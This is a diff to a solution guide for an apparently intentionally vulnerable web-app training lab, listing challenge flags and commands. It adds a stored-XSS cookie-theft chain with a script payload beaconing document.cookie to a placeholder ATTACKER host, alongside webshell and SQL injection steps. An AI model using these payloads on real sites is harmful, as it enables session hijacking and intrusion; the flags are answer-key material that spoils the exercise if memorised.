@@ -17,7 +17,7 @@ Try each vuln yourself first (checklist Phase 0 → detect → exploit). `U=http
 | File upload | `FLAG{w3bshell_upl0ad_to_rce}` | webshell → `cat private/upload_flag.txt` |
 | Info disclosure | `FLAG{c0nfig_backup_left_in_webroot}` | `GET /config.php.bak` |
 | Weak creds | admin's note (above) | log in as `admin` with the cracked/guessed password |
-| Weak CSP | *(analysis finding — no flag)* | identify `script-src 'unsafe-inline'` in the CSP header |
+| Weak CSP (+ cookie theft) | `FLAG{xss_st34ls_the_c00kie}` (via stored XSS) | `curl -sD - -o /dev/null $U/index.php | grep -i csp`; non-HttpOnly cookie + unsafe-inline |
 
 ## 1. SQL injection — auth bypass + UNION  (`login.php`, `index.php?q=`)
 **Answer:** login is a string-concatenated query → bypass with a comment; search is injectable → UNION-dump every credential.
@@ -85,10 +85,45 @@ curl -s "$U/uploads/sh.php?c=id"
 ```
 **Result:** `uid=...` → RCE. **Reason:** `move_uploaded_file` with the raw client filename, no validation; `uploads/` is servable.
 
-## 8. Weak CSP  (every page)
-**Answer:** the CSP allows `script-src 'unsafe-inline'`, so injected inline scripts run (the XSS is *not* mitigated).
-**Command:** `curl -sD - "$U/" -o /dev/null | grep -i content-security-policy`
-**Result:** `...script-src 'self' 'unsafe-inline'...`. **Reason:** `'unsafe-inline'` defeats the main purpose of CSP — compare with challenges 5/6 where it was absent.
+## 8. Weak CSP + cookie theft  (every page)
+
+**Answer:** the CSP is present but bypassable — `script-src 'unsafe-inline'` lets injected inline scripts
+run, `img-src *` lets a beacon exfiltrate to any host, and the session/flag cookie is set **without
+`HttpOnly`**, so JavaScript can read it. Chained with the stored XSS this steals the cookie:
+`FLAG{xss_st34ls_the_c00kie}`.
+
+**Command:**
+```
+# read the RESPONSE headers (server -> you): the CSP and the Set-Cookie both live here
+curl -sD - -o /dev/null "$U/index.php" | grep -iE 'content-security-policy|set-cookie'
+#   Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; img-src *
+#   Set-Cookie: flag=FLAG{xss_st34ls_the_c00kie}          <- note: no HttpOnly -> JS can read it
+
+# attacker listener (receives the stolen cookie in its access log)
+python3 -m http.server 9001
+
+# payload posted as a GUESTBOOK MESSAGE (stored XSS); runs in every viewer's browser
+<script>new Image().src='http://ATTACKER:9001/steal?c='+document.cookie</script>
+```
+**Result:** on page load the listener logs `GET /steal?c=flag=FLAG{xss_st34ls_the_c00kie}`.
+
+**Reason / how the payload is derived:**
+- Stored XSS → arbitrary JS runs in viewers' browsers.
+- `document.cookie` is readable because the cookie has **no `HttpOnly`** → there's a value worth stealing.
+- Exfiltrate by making the browser request an attacker URL with the data in the query string.
+- **Use an image beacon, not `fetch()`** — the CSP has `img-src *` (image to any host = allowed) but no
+  `connect-src`, which falls back to `default-src 'self'` (so `fetch`/XHR to an external host = blocked).
+  Reading the CSP tells you which exfil channel survives it.
+
+**Impact:** session hijacking via XSS despite a CSP being deployed — a false sense of security.
+
+**Remediation (any one breaks the chain):** drop `'unsafe-inline'` (use a nonce/hash); restrict `img-src`
+to known hosts (and set `connect-src`); set the cookie **`HttpOnly; Secure; SameSite=Strict`** — `HttpOnly`
+alone would have stopped the theft even with the weak CSP.
+
+> Finding the headers: browser **DevTools → Network → click the document → Response Headers**, or
+> `curl -I` / `curl -sD -`. Request headers are what the browser sends; **CSP and Set-Cookie are response
+> headers** (server -> browser).
 
 ## 9. Information disclosure — exposed config backup leaks admin creds
 
